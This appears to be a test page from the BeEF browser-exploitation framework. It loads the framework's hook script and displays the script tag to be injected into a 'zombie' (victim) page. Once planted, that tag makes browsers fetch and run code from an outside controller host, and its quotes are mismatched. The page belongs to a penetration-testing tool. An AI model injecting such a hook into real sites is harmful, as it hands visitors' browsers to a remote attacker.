<?php
	require_once("../include/common.inc.php");
?>
<html>
<head>
	<title>BeEF Test Page</title>
	<link rel="stylesheet" type="text/css" href="../css/firefox/style.css">
		<link rel="icon" href="favicon.ico" type="image/x-icon">
		<script type="text/javascript" src="<?php echo BEEF_DOMAIN?>hook/beefmagic.js.php"></script> 
</head>
<body>
	<img src="../images/beef.gif" alt="BeEF"/>BeEF Test Page<br><br>


	The following code needs to be included in the zombie:<br>
	<code>
	&#x3C;script language='Javascript'
	src="http://<?php=$_SERVER['SERVER_NAME']?>/beef/hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
    </code>
    <br>
    
</body>
</html>
